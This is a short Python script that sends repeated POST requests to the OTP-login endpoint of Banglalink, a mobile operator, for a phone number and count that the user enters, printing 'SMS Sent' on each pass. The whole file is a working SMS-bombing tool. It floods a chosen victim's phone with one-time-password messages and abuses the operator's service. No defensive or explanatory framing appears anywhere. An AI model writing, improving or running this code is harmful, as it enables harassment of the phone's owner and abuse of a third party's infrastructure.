import requests 

apt="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"

number=str(input("Enter the number"))
amount=int(input(" Enter The Amount ")) 

know={'mobile':number}

for i in range(amount):
    requests.post(apt,data=know)
    print(str(i+1)+" SMS Sent")